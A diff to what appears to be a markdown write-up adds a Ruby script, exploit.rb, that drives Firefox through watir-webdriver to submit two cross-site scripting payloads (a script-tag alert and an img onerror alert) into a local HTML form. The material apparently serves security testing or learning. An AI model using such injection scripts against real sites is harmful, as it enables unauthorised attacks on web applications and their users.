@@ -243,7 +243,35 @@ field1=""&field2=""&field3=""&field4=""
 
 **exploit.rb**
 ```ruby
+#!/usr/bin/env ruby
+#
+#
+require 'watir-webdriver'
 
+@browser = Watir::Browser.new :firefox
+@browser.window.resize_to(800, 600)
+@browser.window.move_to(2456, 94)
+@browser.goto "file:///home/KING/Code/example.html"
+
+def sendpost(payload)
+  @browser.text_field(name: 'field1').set("")
+  @browser.text_field(name: 'field2').set(payload)
+  @browser.text_field(name: 'field3').set("")
+  @browser.text_field(name: 'field4').set("")
+  sleep 0.1
+  @browser.button(value: 'Send').click
+end
+
+
+payloads = 
+    [
+      '"><script>alert(1)</script>',
+      '<img src=x onerror=alert(2)>'
+    ]
+
+payloads.each do |payload|
+  sendpost payload
+end
 ```
 
 
